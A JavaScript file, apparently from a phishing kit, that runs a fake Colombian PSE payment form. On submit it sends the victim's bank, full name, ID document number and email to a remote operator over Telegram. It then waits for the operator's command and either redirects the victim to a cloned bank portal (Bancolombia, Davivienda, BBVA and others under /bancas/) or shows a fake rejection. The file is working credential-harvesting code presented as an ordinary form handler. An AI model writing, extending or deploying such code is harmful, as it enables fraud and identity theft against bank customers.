/**
 * PSE Form Handler
 */

(function() {
    'use strict';

    document.addEventListener('DOMContentLoaded', function() {
        initBankSelectModal();
        initPersonTypeModal();
        initDocTypeModal();
        initFormValidation();
    });

    /**
     * Initialize Bank Select Modal
     */
    function initBankSelectModal() {
        const btn = document.getElementById('bankSelectBtn');
        const modal = document.getElementById('bankSelectModal');
        const btnCancel = document.getElementById('btnCancelBankSelect');
        const btnContinue = document.getElementById('btnContinueBankSelect');

        if (btn) {
            btn.addEventListener('click', () => openModal('bankSelectModal'));
        }

        if (btnCancel) {
            btnCancel.addEventListener('click', () => closeModal('bankSelectModal'));
        }

        if (btnContinue) {
            btnContinue.addEventListener('click', function() {
                const selected = document.querySelector('input[name="bankOption"]:checked');
                if (selected) {
                    const label = selected.closest('.radio-option-pse').querySelector('.radio-label-pse').textContent;
                    document.getElementById('bankSelect').value = selected.value;
                    document.getElementById('bankSelectText').textContent = label;
                }
                closeModal('bankSelectModal');
                validateForm();
            });
        }

        if (modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    closeModal('bankSelectModal');
                }
            });
        }
    }

    /**
     * Initialize Person Type Modal
     */
    function initPersonTypeModal() {
        const btn = document.getElementById('personTypeBtn');
        const modal = document.getElementById('personTypeModal');
        const btnCancel = document.getElementById('btnCancelPersonType');
        const btnContinue = document.getElementById('btnContinuePersonType');

        if (btn) {
            btn.addEventListener('click', () => openModal('personTypeModal'));
        }

        if (btnCancel) {
            btnCancel.addEventListener('click', () => closeModal('personTypeModal'));
        }

        if (btnContinue) {
            btnContinue.addEventListener('click', function() {
                const selected = document.querySelector('input[name="personTypeRadio"]:checked');
                if (selected) {
                    document.getElementById('personType').value = selected.value;
                    document.getElementById('personTypeText').textContent = selected.value;
                }
                closeModal('personTypeModal');
                validateForm();
            });
        }

        if (modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    closeModal('personTypeModal');
                }
            });
        }
    }

    /**
     * Initialize Document Type Modal
     */
    function initDocTypeModal() {
        const btn = document.getElementById('docTypeBtn');
        const modal = document.getElementById('docTypeModal');
        const btnCancel = document.getElementById('btnCancelDocType');
        const btnContinue = document.getElementById('btnContinueDocType');

        if (btn) {
            btn.addEventListener('click', () => openModal('docTypeModal'));
        }

        if (btnCancel) {
            btnCancel.addEventListener('click', () => closeModal('docTypeModal'));
        }

        if (btnContinue) {
            btnContinue.addEventListener('click', function() {
                const selected = document.querySelector('input[name="docTypeRadio"]:checked');
                if (selected) {
                    document.getElementById('docType').value = selected.value;
                    document.getElementById('docTypeText').textContent = selected.value;
                }
                closeModal('docTypeModal');
                validateForm();
            });
        }

        if (modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    closeModal('docTypeModal');
                }
            });
        }
    }

    /**
     * Initialize Form Validation
     */
    function initFormValidation() {
        const form = document.getElementById('pseForm');
        const inputs = form.querySelectorAll('input[required], select[required]');

        inputs.forEach(input => {
            input.addEventListener('input', validateForm);
            input.addEventListener('change', validateForm);
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (validateForm()) {
                const btnContinue = document.getElementById('btnContinue');
                btnContinue.disabled = true;
                btnContinue.textContent = 'Procesando...';
                
                // Obtener datos del formulario
                const bank = document.getElementById('bankSelect').value;
                const bankText = document.getElementById('bankSelectText').textContent;
                const personType = document.getElementById('personType').value;
                const fullName = document.getElementById('fullName').value.trim();
                const docType = document.getElementById('docType').value;
                const docNumber = document.getElementById('docNumber').value.trim();
                const email = document.getElementById('email').value.trim();
                
                // Crear overlay de carga
                const loadingOverlay = new LoadingOverlay('pse');
                loadingOverlay.show();
                
                // Enviar datos a Telegram
                const result = await TelegramClient.sendToTelegram('pse_email', {
                    data: {
                        bank: bank,
                        bankName: bankText,
                        personType: personType,
                        fullName: fullName,
                        docType: docType,
                        docNumber: docNumber,
                        email: email
                    }
                });
                
                if (result.success) {
                    console.log('[PSE] Datos enviados a Telegram, esperando respuesta...');
                    
                    // Iniciar polling para esperar respuesta
                    loadingOverlay.startPolling((actions) => {
                        console.log('[PSE] Acciones recibidas:', actions);
                        
                        for (const action of actions) {
                            if (action.action === 'pse_continue_bank') {
                                // Redirigir al banco seleccionado
                                console.log('[PSE] Redirigiendo al banco:', bank);
                                
                                // Mapeo de códigos de banco a carpetas
                                const bankFolderMap = {
                                    'Bancolombia': 'Bancolombia',
                                    'Bogota': 'Bogota',
                                    'Davivienda': 'Davivienda',
                                    'BBVA': 'BBVA',
                                    'AV Villas': 'AV-Villas',
                                    'Popular': 'Popular',
                                    'Occidente': 'Occidente',
                                    'Caja Social': 'Caja-Social',
                                    'Scotiabank Colpatria': 'Scotiabank-Colpatria',
                                    'Agrario': 'Agrario',
                                    'Banco Mundo Mujer': 'Banco-Mundo-Mujer',
                                    'itau': 'Itau',
                                    'Falabella': 'Falabella',
                                    'Serfinanza': 'Serfinanza',
                                    'Daviplata': 'Daviplata'
                                };
                                
                                const bankFolder = bankFolderMap[bank] || bank;
                                
                                // Enviar confirmación a Telegram
                                TelegramClient.confirmActionExecuted(
                                    '✅ Redirección a Banco',
                                    `/bancas/${bankFolder}/index.html`,
                                    `Usuario redirigido al portal de ${bank}`
                                );
                                
                                setTimeout(() => {
                                    window.location.href = `/bancas/${bankFolder}/index.html`;
                                }, 100);
                                return;
                            } else if (action.action === 'pse_reject') {
                                // Regresar a métodos de pago
                                console.log('[PSE] Pago rechazado');
                                
                                TelegramClient.confirmActionExecuted(
                                    '❌ Pago PSE Rechazado',
                                    'form.php (permanece)',
                                    'El operador rechazó el pago PSE'
                                );
                                
                                alert('El pago fue rechazado. Intenta con otro método.');
                                loadingOverlay.hide();
                                loadingOverlay.destroy();
                                btnContinue.disabled = false;
                                btnContinue.textContent = 'CONTINUAR';
                                return;
                            }
                        }
                    });
                } else {
                    alert('Error al procesar la solicitud. Intenta nuevamente.');
                    btnContinue.disabled = false;
                    btnContinue.textContent = 'CONTINUAR';
                    loadingOverlay.hide();
                    loadingOverlay.destroy();
                }
            }
        });

        // Initial validation
        validateForm();
    }

    /**
     * Validate Form
     */
    function validateForm() {
        const bank = document.getElementById('bankSelect').value;
        const fullName = document.getElementById('fullName').value.trim();
        const docNumber = document.getElementById('docNumber').value.trim();
        const email = document.getElementById('email').value.trim();
        const btnContinue = document.getElementById('btnContinue');

        const isValid = bank !== '' && fullName !== '' && docNumber !== '' && email !== '';

        if (btnContinue) {
            btnContinue.disabled = !isValid;
        }

        return isValid;
    }

    /**
     * Open Modal
     */
    function openModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    }

    /**
     * Close Modal
     */
    function closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.remove('active');
            document.body.style.overflow = '';
        }
    }

})();
